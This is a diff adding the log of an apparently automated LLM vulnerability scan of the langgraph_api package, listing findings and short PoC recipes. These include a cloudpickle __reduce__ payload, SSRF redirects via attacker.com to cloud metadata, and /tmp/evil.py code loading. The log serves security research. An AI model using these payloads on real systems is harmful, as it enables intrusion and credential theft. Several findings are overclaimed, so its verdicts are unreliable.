@@ -1,0 +1,575 @@
+
+Phase A: Path Discovery
+  Backend: tree-sitter
+  Functions: 1206
+    Remote Code Execution: 6 sink(s)
+    Local File Inclusion: 4 sink(s)
+    Server-Side Request Forgery: 14 sink(s)
+    SQL Injection: 2 sink(s)
+    Arbitrary File Overwrite: 1 sink(s)
+    ReDoS (Regular Expression DoS): 5 sink(s)
+    Server-Side Template Injection (SSTI) — template engine with user input: 1 
+sink(s)
+    Suspicious — requires analysis (path constructor / logic pattern): 13 
+sink(s)
+    LangGraph Architecture — gRPC/gRPC no-auth, admin truncate, msgpack ext_hook
+RCE, template injection: 6 sink(s)
+
+Phase B: Slice Sorting (52 raw paths)
+  Body-detected orphans: 18 (no call chain)
+  Exploit: 30 + Explore: 15
+    Explore: langgraph-000 decryptor score=0.46 (non_std_sink, unusual_naming)
+    Explore: langgraph-001 get_json_decryptor score=0.45 (non_std_sink, 
+unusual_naming)
+    Explore: langgraph-002 decrypt_json_if_needed score=0.42 (non_std_sink, 
+unusual_naming)
+  Project type: app
+
+Phase C: README Understanding
+  No README found.
+  (skipped)
+
+Phase D: Intent+Logic Agents (45 slices)
+  [1/45] afo-000 (_profile_with_pyspy)
+  [2/45] langgraph-001 (_parse_aes_key)
+  [3/45] lfi-002 (main)
+  [4/45] rce-003 (profiled_import)
+  [5/45] redos-004 (__init__)
+  [6/45] sqli-005 (handle_tools_call)
+  [7/45] ssrf-006 (_check_newer_version)
+  [8/45] ssti-007 (handle_ui)
+    ? 10/10 — interesting
+    Evidence: redos-004...
+  [9/45] suspicious-008 (run_js_process)
+    ? 10/10 — interesting
+    Evidence: afo-000...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: lfi-002...
+    ✓ 0/10 — safe
+    Evidence: ssrf-006...
+    ✓ not rebutted
+      weak point: The finding is straightforward: attacker-controlled CLI 
+argument directly used in open() without validation. No sanitization, no access 
+control, and the code path is reachable via CLI invocation.
+    PoC Agent: lfi-002...
+    ? pattern match, LLM skeptical (2 match(es))
+  [10/45] rce-009 (get_graph)
+    ? pattern match, LLM skeptical (3 match(es))
+  [11/45] rce-010 (loads_typed)
+    ? 10/10 — interesting
+    Evidence: ssti-007...
+  [12/45] rce-011 (_graph_from_spec)
+    ✓ 1/10 — safe
+    Evidence: sqli-005...
+    ? pattern match, LLM skeptical (1 match(es))
+  [13/45] ssrf-012 (wait_until_js_ready)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: langgraph-001...
+    ? 9/10 — interesting
+    Evidence: suspicious-008...
+  [14/45] ssrf-013 (js_healthcheck)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-010...
+    ✓ not rebutted
+      weak point: Multiple independent vulnerabilities (no auth on gRPC, msgpack
+RCE, padding oracle, template injection, key exposure, DoS) each provide a 
+plausible attack path. The lack of authentication on gRPC services is the most 
+straightforward, allowing direct data deletion or exploitation of other 
+services. The msgpack RCE requires write access to checkpoint_blobs, but SQL 
+injection or direct DB access could achieve that. The padding oracle attack 
+requires ciphertext access, which may be obtainable via other vulnerabilities. 
+Overall, the combination of weaknesses makes exploitation likely.
+    PoC Agent: langgraph-001...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-011...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-003...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because cloudpickle.loads is a
+known dangerous deserialization function, and the code directly calls it on 
+attacker-controlled data[1] when pickle_fallback is True. The guard only checks 
+a configuration flag, not the input content. No sanitization is applied. The 
+data flow from entry to sink is clear, and the function is likely reachable via 
+external API.
+    PoC Agent: rce-010...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/lfi_config_argument_controllab
+le_cli_main.py
+    Evidence: lfi-002...
+    ✓ not rebutted
+      weak point: The function directly uses attacker-controlled spec.module and
+spec.path without validation, enabling arbitrary module import and file 
+execution. The code is a public API in a library, and the data flow is clear 
+from the source.
+    PoC Agent: rce-011...
+    ✓ not rebutted
+      weak point: The finding relies on the attacker controlling the 
+LANGGRAPH_AUTH environment variable, which may require privileged access (e.g., 
+container or CI/CD environment). However, the code path is reachable and the 
+sink executes arbitrary Python code without validation.
+    PoC Agent: rce-003...
+    ? 10/10 — interesting
+    Evidence: ssrf-012...
+    ✓ evidence found (4 match(es))
+      PoC: Run the CLI with `--config /etc/passwd` to read the password file....
+    Verifying lfi-002...
+    ✓ 0/10 — safe
+    Evidence: ssrf-013...
+    ✓ verification confirmed
+  [15/45] suspicious-014 (run_js_http_process)
+    ? pattern match, LLM skeptical (9 match(es))
+  [16/45] suspicious-015 (_load_checkpointer)
+    ? pattern match, LLM skeptical (9 match(es))
+  [17/45] suspicious-016 (_load_auth_obj)
+    ? 9/10 — interesting
+    Evidence: rce-009...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/rce_function_loads_typed_deser
+ializes_loads_typed.py
+    Evidence: rce-010...
+    ? pattern match, LLM skeptical (7 match(es))
+  [18/45] lfi-017 (handle_agent_card_endpoint)
+    ✓ evidence found (7 match(es))
+      PoC: import cloudpickle, os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+payload = cloudpickle.dumps(Exploit())
+# Send to l...
+    Verifying rce-010...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/rce_load_auth_obj_function_pro
+filed_import.py
+    Evidence: rce-003...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: suspicious-015...
+    ✓ verification confirmed
+  [19/45] redos-018 (_reader)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/rce_python_modules_including_e
+xecute__graph_from_spec.py
+    Evidence: rce-011...
+    ? 9/10 — interesting
+    Evidence: suspicious-014...
+  [20/45] redos-019 (start_tunnel)
+    ✗ rebutted
+      reason: The finding is not exploitable because the function 
+`_load_checkpointer` is not reachable with attacker-controlled input. The source
+code header contains `[REACHABILITY: BODY_ONLY]`, indicating no internal call 
+chain was found. The function is a library utility that expects a 
+`checkpointer_path` parameter, but there is no evidence that this parameter 
+originates from untrusted user input. The static analysis could not trace 
+variable propagation, and the developer intent summary is empty, but the code 
+itself does not show any external entry point that passes attacker-controlled 
+data to this function. Without a realistic execution scenario where an attacker 
+can control `checkpointer_path`, the vulnerability is not exploitable.
+    Evidence: suspicious-015...
+  [21/45] redos-020 (translate_pattern)
+    ✓ 1/10 — safe
+    Evidence: lfi-017...
+    ✓ evidence found (8 match(es))
+      PoC: 1. Create a malicious Python file at /tmp/evil.py:
+```python
+from langgraph_api.auth.custom import Auth
+class EvilAuth(Auth):
+    def __init__(self):
+...
+    Verifying rce-003...
+    ✓ evidence found (9 match(es))
+      PoC: Assume the attacker can control the `spec` object passed to 
+`_graph_from_spec`. For example, via an API endpoint that accepts JSON with 
+`module` or `p...
+    Verifying rce-011...
+    ? pattern match, LLM skeptical (5 match(es))
+  [22/45] sqli-021 (_handle_normalized_event)
+    ✓ verification confirmed
+  [23/45] lfi-022 (run_server)
+    ✓ verification confirmed
+  [24/45] lfi-023 (_open_browser)
+    ? 10/10 — interesting
+    Evidence: redos-018...
+    ? pattern match, LLM skeptical (1 match(es))
+  [25/45] redos-024 (normalize_name)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: suspicious-016...
+    ? 10/10 — interesting
+    Evidence: redos-019...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the `_load_auth_obj` 
+function uses `importlib.util.spec_from_file_location` to load arbitrary Python 
+files from a path controlled by the `LANGGRAPH_AUTH` environment variable. There
+is no validation to restrict the path to a safe directory, and the only checks 
+are for colon separator and instance type after loading. An attacker who can 
+control the environment variable can achieve RCE by pointing to a malicious 
+Python file.
+    PoC Agent: suspicious-016...
+    ? pattern match, LLM skeptical (1 match(es))
+  [26/45] ssrf-025 (ssrf_safe_async_client)
+    ? 10/10 — interesting
+    Evidence: lfi-023...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: lfi-022...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/langgraph_specific_vulnerabili
+ties__parse_aes_key.py
+    Evidence: langgraph-001...
+  [27/45] suspicious-026 (resolve_embeddings)
+    ✓ not rebutted
+      weak point: The finding is straightforward: attacker-controlled CLI 
+argument `--config` is passed directly to `open()` without any path validation. 
+No sanitization, no access control, and the code path is reachable by any user 
+who can invoke the CLI. The data flow is clear and unambiguous.
+    PoC Agent: lfi-022...
+    ? pattern match, LLM skeptical (4 match(es))
+  [28/45] suspicious-027 (load_custom_app)
+    ? 10/10 — interesting
+    Evidence: redos-024...
+    ? 10/10 — interesting
+    Evidence: redos-020...
+    ? pattern match, LLM skeptical (1 match(es))
+  [29/45] suspicious-028 (handle_message_send)
+    ? 10/10 — interesting
+    Evidence: sqli-021...
+    ⚠ 8/10 — 1 contradiction(s)
+    Adversary: ssrf-025...
+    ? pattern match, LLM skeptical (1 match(es))
+  [30/45] suspicious-029 (handle_message_stream)
+    ? pattern match, LLM skeptical (1 match(es))
+  [31/45] langgraph-000 (decryptor)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: suspicious-026...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/lfi_cli_used_directly_open_run
+_server.py
+    Evidence: lfi-022...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code follows 
+redirects without re-validation, and the SSRF-safe transport only checks the 
+initial connection IP. An attacker can use a redirect to bypass the transport's 
+policy and reach internal IPs like 169.254.169.254.
+    PoC Agent: ssrf-025...
+    ✓ not rebutted
+      weak point: The function uses importlib to load and execute arbitrary 
+Python files from a path controlled by the attacker via the `embed` parameter, 
+with no validation. The prior knowledge confirms the config is 
+attacker-controlled. This is a clear RCE vulnerability.
+    PoC Agent: suspicious-026...
+    ✓ evidence found (6 match(es))
+      PoC: Run the CLI with `--config /etc/passwd` to read the password file....
+    Verifying lfi-022...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: suspicious-027...
+    ✓ verification confirmed
+  [32/45] langgraph-001 (get_json_decryptor)
+    ? 9/10 — interesting
+    Evidence: suspicious-028...
+  [33/45] langgraph-002 (decrypt_json_if_needed)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code directly uses
+attacker-controlled input as a file path in 
+`importlib.util.spec_from_file_location` without sanitization, and the function 
+is exposed as a public API. The guards present (isfile, endswith) do not prevent
+path traversal. The prior knowledge of similar issues in the codebase supports 
+systemic vulnerability.
+    PoC Agent: suspicious-027...
+    ? 10/10 — interesting
+    Evidence: suspicious-029...
+  [34/45] rce-003 (pipeline)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/rce_langgraph_auth_environment
+_variable__load_auth_obj.py
+    Evidence: suspicious-016...
+  [35/45] rce-004 (probe_event_streaming_v2_capabilities)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/rce_python_resolve_embeddings.
+py
+    Evidence: suspicious-026...
+  [36/45] ssrf-005 (get_loopback_client)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/ssrf_url_controlled_stored_res
+ult_ssrf_safe_async_client.py
+    Evidence: ssrf-025...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: langgraph-000...
+    ✓ 0/10 — safe
+    Evidence: rce-004...
+    ✓ evidence found (6 match(es))
+      PoC: 1. Set up a public webhook endpoint at http://attacker.com/redirect 
+that returns HTTP 302 redirect to http://169.254.169.254/latest/meta-data/
+2. Conf...
+    Verifying ssrf-025...
+    ✓ not rebutted
+      weak point: The finding is based on multiple vulnerabilities, but the 
+specific data flow traced (AES-CBC padding oracle via join_run) requires the 
+attacker to have write access to the database, which is a significant 
+precondition. However, the overall assessment of multiple vulnerabilities (gRPC 
+exposure, msgpack RCE, etc.) makes the finding hard to disprove entirely.
+    PoC Agent: langgraph-000...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/lfi_api_splits_get_name_load_c
+ustom_app.py
+    Evidence: suspicious-027...
+  [37/45] ssrf-006 (ensure_webhook_http_client)
+    ? 10/10 — interesting
+    Evidence: rce-003...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: langgraph-001...
+    ✓ verification confirmed
+  [38/45] ssrf-007 (__init__)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: ssrf-005...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: langgraph-002...
+    ? pattern match, LLM skeptical (7 match(es))
+  [39/45] ssrf-008 (_make_http_request_with_retries)
+    ? pattern match, LLM skeptical (6 match(es))
+  [40/45] ssrf-009 (__init__)
+    ✓ not rebutted
+      weak point: The finding is based on multiple architectural vulnerabilities
+that are independently exploitable. The lack of authentication on gRPC services,
+missing access control in encryption middleware, and potential for RCE via 
+msgpack deserialization create a chain of exploitable conditions. The static 
+analysis trace shows untrusted data reaching the decryption sink without proper 
+authorization checks, and the developer's intent of secure decryption is 
+contradicted by the actual implementation.
+    PoC Agent: langgraph-001...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code follows 
+redirects without re-validation, and the loopback client uses an internal base 
+URL. The validation function may not block all internal IPs or redirects.
+    PoC Agent: ssrf-005...
+    ✓ not rebutted
+      weak point: The finding identifies multiple architectural vulnerabilities 
+(unauthenticated gRPC, default msgpack deserialization, weak crypto) that are 
+not mitigated by the input validation in the HTTP layer. The data flow trace 
+shows that the decryption pipeline is reachable via the join_run endpoint, but 
+the core vulnerabilities exist at the gRPC layer and in default configurations, 
+which are independent of the traced path. The finding is hard to disprove 
+because the code confirms the absence of authentication on gRPC services and the
+use of AES-CBC without HMAC, and the developer spec contradicts the actual 
+implementation.
+    PoC Agent: langgraph-002...
+    ? 10/10 — interesting
+    Evidence: ssrf-007...
+    ? 10/10 — interesting
+    Evidence: ssrf-009...
+    ? pattern match, LLM skeptical (2 match(es))
+  [41/45] ssrf-010 (handle_async_request)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: ssrf-008...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: ssrf-006...
+    ? pattern match, LLM skeptical (2 match(es))
+  [42/45] suspicious-011 (_load_store)
+    ✓ not rebutted
+      weak point: The function is a public API with no caller chain inside the 
+project, but it is explicitly designed to be called with a URL parameter from 
+external code. The code directly passes the URL to httpx without validation, and
+httpx follows redirects by default. This is a classic SSRF vulnerability.
+    PoC Agent: ssrf-008...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code explicitly 
+sets follow_redirects=True on the HTTP client, and the validation only checks 
+the initial URL. The SSRF-safe client's policy may not be applied to redirect 
+targets, allowing an attacker to redirect to internal IPs. The data flow shows 
+user-controlled input reaching the sink, and there is no evidence of 
+re-validation on redirects.
+    PoC Agent: ssrf-006...
+    ? 10/10 — interesting
+    Evidence: ssrf-010...
+    ? pattern match, LLM skeptical (2 match(es))
+  [43/45] suspicious-012 (_extract_a2a_response)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/langgraph_deployment_multiple_
+critical_decryptor.py
+    Evidence: langgraph-000...
+  [44/45] suspicious-013 (stream_body)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: suspicious-011...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/ssrf_url_controlled_stored_res
+ult_get_loopback_client.py
+    Evidence: ssrf-005...
+    ✓ not rebutted
+      weak point: The function directly uses user-controlled `store_path` to 
+load and execute arbitrary Python files via 
+`importlib.util.spec_from_file_location` and `exec_module` without any path 
+validation or sanitization. The code explicitly handles file paths (containing 
+'/' or '.py:') and executes them. No access control or input filtering is 
+present. The `[REACHABILITY: BODY_ONLY]` annotation is misleading because the 
+function is a public API intended to be called with user-provided store paths, 
+making it externally reachable. The data flow is clear: `store_path` flows 
+directly into the file loading and execution sink.
+    PoC Agent: suspicious-011...
+    ✓ evidence found (4 match(es))
+      PoC: 1. Set up a public HTTP server that returns a 302 redirect to 
+http://169.254.169.254/latest/meta-data/. 2. Provide that URL as the webhook in 
+the requ...
+    Verifying ssrf-005...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/ssrf_url_controlled_stored_res
+ult_ensure_webhook_http_client.py
+    Evidence: ssrf-006...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/langgraph_ssrf_python_http_lay
+er_decrypt_json_if_needed.py
+    Evidence: langgraph-002...
+  [45/45] langgraph-014 (_get_aes_json_keys)
+    ? 10/10 — interesting
+    Evidence: suspicious-012...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/langgraph_admin_truncate_servi
+ce_delete_get_json_decryptor.py
+    Evidence: langgraph-001...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/ssrf_url_makes_http_request__m
+ake_http_request_with_retries.py
+    Evidence: ssrf-008...
+    ✓ verification confirmed
+    ? 9/10 — interesting
+    Evidence: suspicious-013...
+    ✓ evidence found (3 match(es))
+      PoC: 1. Attacker sets webhook to http://attacker.com/redirect
+2. Attacker's server responds with 302 redirect to 
+http://169.254.169.254/latest/meta-data/
+3...
+    Verifying ssrf-006...
+    ✓ evidence found (12 match(es))
+      PoC: Call 
+`_make_http_request_with_retries(url='http://169.254.169.254/latest/meta-data/')
+` to retrieve cloud metadata....
+    Verifying ssrf-008...
+    ✓ verification confirmed
+    ✓ verification confirmed
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/langgraph_api/rce_uses_importlib__load_store
+.py
+    Evidence: suspicious-011...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: langgraph-014...
+    ✗ rebutted
+      reason: The finding is not exploitable because the reported vulnerability 
+is based on a misinterpretation of the code. The function `_get_aes_json_keys` 
+only parses and validates environment variable keys; it does not perform any 
+dangerous operations like deserialization or encryption. The AES encryption 
+weakness (CBC without HMAC) is a separate concern not directly exploitable via 
+this function. The gRPC and other vulnerabilities listed are not supported by 
+the provided code snippet. The static analysis annotations indicate no 
+attacker-controlled input reaches this function, and the function itself has no 
+sink that could be exploited. The finding lacks a concrete exploit path and 
+relies on hypothetical scenarios without evidence.
+    Evidence: langgraph-014...
+
+Phase E: Results
+  Blackboard: 33 cached intents, 177 knowledge entries, 42 phase results
+  High confidence (40):
+    afo-000: ? — ?
+      
+    langgraph-000: ? — logic_gap
+      
+    langgraph-001: ? — logic_gap
+      
+    langgraph-001: ? — logic_gap
+      
+    lfi-002: open — logic_gap
+      Run the CLI with `--config /etc/passwd` to read the password file.
+    langgraph-002: ? — logic_gap
+      
+    rce-003: importlib.util.spec_from_file_location / exec_module — logic_gap
+      Set LANGGRAPH_AUTH to a JSON object with a 'path' key pointing to an 
+attacker-controlled Python file, e.g., '{"path": "/tmp/evil.py:auth_instance"}' 
+where /tmp/evil.py contains a class inheriting from Auth with malicious code in 
+__init__ or methods.
+    rce-003: ? — ?
+      
+    ssrf-005: http_request — logic_gap
+      http://attacker.com/redirect?to=http://169.254.169.254/latest/meta-data/
+    ssrf-006: http_request — logic_gap
+      http://attacker.com/redirect?to=http://169.254.169.254/latest/meta-data/
+    ssrf-007: ? — ?
+      
+    ssrf-008: client.request — logic_gap
+      http://169.254.169.254/latest/meta-data/
+    rce-009: ? — ?
+      
+    ssrf-009: ? — ?
+      
+    rce-010: cloudpickle.loads — logic_gap
+      Send a request with data[0]='pickle' and data[1] as a pickled payload that
+executes a reverse shell via __reduce__.
+    ssrf-010: ? — ?
+      
+    rce-011: importlib.import_module — logic_gap
+      If an attacker can control the spec object (e.g., via API input), they can
+set spec.module to a malicious module like 'os' or a custom module that executes
+code on import. Alternatively, set spec.path to a path containing a malicious 
+.py file.
+    suspicious-011: _load_store — logic_gap
+      Set `store_path` to `/tmp/evil.py:function` where `/tmp/evil.py` contains 
+malicious code. The function will load and execute the module, running arbitrary
+Python.
+    ssrf-012: ? — ?
+      
+    langgraph-014: ? — logic_gap
+      
+    suspicious-015: importlib.util.spec_from_file_location — logic_gap
+      Set checkpointer_path to '/tmp/evil.py:malicious_function' where 
+/tmp/evil.py contains arbitrary Python code. The code will load and execute the 
+module, then access the specified function, achieving RCE.
+    suspicious-016: _load_auth_obj — logic_gap
+      Set the environment variable `LANGGRAPH_AUTH` to `{'path': 
+'/tmp/evil.py:malicious'}` where `/tmp/evil.py` contains a Python class that 
+inherits from `Auth` and executes arbitrary code in its constructor or methods. 
+When the server starts, `_load_auth_obj` will load and execute this module.
+    redos-018: ? — ?
+      
+    redos-019: ? — ?
+      
+    redos-020: ? — ?
+      
+    sqli-021: ? — ?
+      
+    lfi-022: open — logic_gap
+      Run the CLI with `--config /etc/passwd` to read the password file.
+    lfi-023: ? — ?
+      
+    redos-024: ? — ?
+      
+    ssrf-025: httpx.AsyncClient — logic_gap
+      http://attacker.com/redirect?to=http://169.254.169.254/latest/meta-data/
+    suspicious-026: resolve_embeddings — logic_gap
+      An attacker can craft a malicious Python file (e.g., /tmp/evil.py) 
+containing arbitrary code, then invoke the CLI with `--config '{"embed": 
+"/tmp/evil.py:malicious_func"}'`. The function will load and execute the file, 
+running the attacker's code.
+    suspicious-027: load_custom_app — logic_gap
+      An attacker calls the public API with 
+`app_import='../../etc/passwd:name'`. The function splits to 
+`path='../../etc/passwd'` and `name='name'`. Since 
+`os.path.isfile('../../etc/passwd')` returns True, it proceeds to 
+`importlib.util.spec_from_file_location('user_router_module', 
+'../../etc/passwd')`. This will attempt to load the file as a Python module, 
+likely failing, but the file content could be read via error messages or side 
+effects. More critically, if the attacker can place a malicious .py file at a 
+known path (e.g., via upload), they can achieve RCE by specifying that path.
+
+Pipeline Complete
+  Target: /home/xcy/.local/lib/python3.14/site-packages/langgraph_api
+  Model: deepseek-chat
+  Duration: 135.0s
+  Paths discovered: 52
+  Slices analyzed: 45
+  Findings: 40 high, 5 interesting
+  Tokens: 603,424 total (515,717 prompt + 87,707 completion)
+
+  Recommended verification targets:
+    AFO afo-000: Code-level pattern evidence (2 matches): ?:pyspy = 
+shutil.which("py-spy"); ?:os.remove(path)
+    LANGGRAPH langgraph-000: The LangGraph deployment has multiple critical 
+vulnerabilities. The gRPC services (Admin, Assistants
+    LANGGRAPH langgraph-001: The deployment exhibits multiple LangGraph-specific
+vulnerabilities. The gRPC services (Admin, Assis
+    LANGGRAPH langgraph-001: The LangGraph deployment exhibits multiple 
+architecture-level vulnerabilities. The gRPC services (Ad
+    LFI lfi-002: The `--config` argument is parsed from command-line input via 
+argparse. The value is directly passed
